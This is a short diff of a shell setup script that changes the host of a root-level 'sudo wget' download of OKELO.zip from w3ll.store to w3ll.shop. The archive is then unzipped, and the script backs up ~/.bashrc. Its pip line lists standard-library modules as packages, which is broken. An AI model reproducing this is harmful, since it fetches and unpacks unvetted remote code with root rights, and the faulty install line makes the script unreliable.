@@ -20,7 +20,7 @@ sudo apt-get install -y python3
 sudo apt-get install -y python3-pip
 sudo pip3 install requests colorama itertools idna uritools appdirs tldextract socket random  struct traceback urlextract configparser
 sudo apt install -y nano
-sudo wget https://w3ll.store/operators/OKELO.zip
+sudo wget https://w3ll.shop/operators/OKELO.zip
 sudo unzip -o OKELO.zip
 sudo rm OKELO.zip
 cp ~/.bashrc ~/.bashrc-bak
